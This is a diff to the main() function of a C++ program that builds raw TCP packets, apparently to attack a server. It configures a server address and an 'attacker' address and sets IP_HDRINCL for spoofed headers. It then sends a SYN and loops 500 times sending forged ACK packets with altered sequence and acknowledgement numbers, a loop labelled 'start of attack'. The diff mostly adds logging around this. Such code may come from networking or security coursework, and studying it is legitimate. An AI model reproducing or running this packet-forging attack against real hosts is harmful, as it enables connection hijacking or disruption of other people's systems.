@@ -75,17 +75,29 @@ int main()
         cerr << "Could not allocate memory for packet buffer" << endl;
         free(packetBuffer);
     }
+    else
+    {
+        cout << "Allocated memory for packet buffer" << endl;
+    }
 
     if (!(dataBuffer = (char *)malloc(520)))
     {
         cerr << "Could not allocate memory for data buffer" << endl;
         free(dataBuffer);
     }
+    else
+    {
+        cout << "Allocated memory for data buffer" << endl;
+    }
 
     if (!(payload = (char *)malloc(512)))
     {
         cerr << "Could not allocate memory for payload" << endl;
         free(payload);
+    }
+    else
+    {
+        cout << "Allocated memory for payload" << endl;
     }
 
     strcpy(payload, "Data send.");
@@ -103,6 +115,10 @@ int main()
         free(dataBuffer);
         free(payload);
     }
+    else
+    {
+        cout << "Created new raw socket" << endl;
+    }
 
     cout << "Configuring server ip...." << endl;
     dest.sin_family = AF_INET;
@@ -112,7 +128,10 @@ int main()
         cout << "Failed" << endl;
         cerr << "Server ip invalid" << endl;
     }
-    cout << "Done configuring server ip" << endl;
+    else
+    {
+        cout << "Done configuring server ip" << endl;
+    }
 
     cout << "Configuring attacker ip...." << endl;
     src.sin_family = AF_INET;
@@ -124,7 +143,10 @@ int main()
         cout << "Failed" << endl;
         cerr << "Source ip invalid" << endl;
     }
-    cout << "Done configuring source ip" << endl;
+    else
+    {
+        cout << "Done configuring source ip" << endl;
+    }
 
     cout << "Configuring socket" << endl;
     if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
@@ -132,7 +154,10 @@ int main()
         cout << "Failed" << endl;
         cerr << "Error in configuring socket" << endl;
     }
-    cout << "Done configuring socket" << endl;
+    else
+    {
+        cout << "Done configuring socket" << endl;
+    }
 
     // SYN packet
     memset(packetBuffer, 0, PACKET_LEN);
@@ -159,8 +184,8 @@ int main()
     if ((sent = sendto(sockfd, packetBuffer, pBufferLen, 0, (struct sockaddr *)&dest,
                        sizeof(struct sockaddr))) < 0)
     {
-        printf("failed.\n");
-        perror("ERROR:");
+        cout << "Failed" << endl;
+        cerr << "Error in ACK" << endl;
     }
 
     pBufferLen = receive_packet(sockfd, packetBuffer, DATAGRAM_LEN, &src);
@@ -171,8 +196,10 @@ int main()
     }
 
     // start of attack
-    for(int i=0; i<500; i++)
+    cout << "Starting attack..." << endl;
+    for (int i = 0; i < 500; i++)
     {
+        cout << "Attack packet " << i << endl;
         force_update_seq_and_ack(packetBuffer, &seqnum, &acknum, i, 1608);
         memset(packetBuffer, 0, DATAGRAM_LEN);
         gather_packet_data(dataBuffer, &sBufferLen, seqnum, acknum, NULL, 0);
@@ -180,11 +207,13 @@ int main()
         if ((sent = sendto(sockfd, packetBuffer, pBufferLen, 0, (struct sockaddr *)&dest,
                            sizeof(struct sockaddr))) < 0)
         {
-            printf("failed.\n");
-            perror("ERROR:");
+            cout << "Failed" << endl;
+            cerr << "Error in sending attacking ACK" << endl;
         }
         sleep(1);
     }
+
+    cout << "End of attack" << endl;
 
     free(dataBuffer);
     return 0;
